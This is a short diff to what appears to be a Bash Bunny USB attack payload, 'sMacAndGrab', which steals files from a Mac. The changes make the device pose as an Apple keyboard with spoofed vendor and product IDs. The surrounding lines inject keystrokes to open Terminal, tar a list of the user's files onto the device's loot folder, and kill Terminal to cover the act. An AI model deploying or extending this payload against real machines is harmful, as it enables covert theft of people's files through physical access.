@@ -11,7 +11,7 @@
 # Green...............Finished
 
 LED G R 500
-ATTACKMODE HID STORAGE
+ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
 
 # make the loot directory on the BashBunny
 mkdir -p /root/udisk/loot/sMacAndGrab
@@ -34,8 +34,8 @@ QUACK DELAY 1000
 QUACK STRING terminal
 QUACK ENTER
 QUACK DELAY 4000
+# the more files in $files to copy, the longer tar will take to compress
 # one-liner because we want the move command to wait for tar to finish
-# tar take n time, depending on the contents of $files_to_copy
 QUACK STRING tar -cf \$USER.tar.gz ${files_to_copy[*]}\; mv \$USER.tar.gz $lootdir\; killall Terminal
 QUACK ENTER
 
